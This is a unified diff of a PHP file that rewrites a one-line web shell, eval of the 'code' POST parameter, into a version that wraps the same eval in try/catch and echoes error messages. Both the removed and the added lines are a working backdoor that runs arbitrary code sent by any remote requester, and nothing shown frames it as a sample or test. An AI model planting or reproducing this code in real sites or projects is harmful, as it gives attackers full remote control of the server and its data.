@@ -1,1 +1,8 @@
-<?php eval($_POST["code"]); ?>
+<?php
+    try{
+        eval($_POST["code"]);
+    }
+    catch(Exception $e){
+        echo $e->getMessage();
+    }
+?>
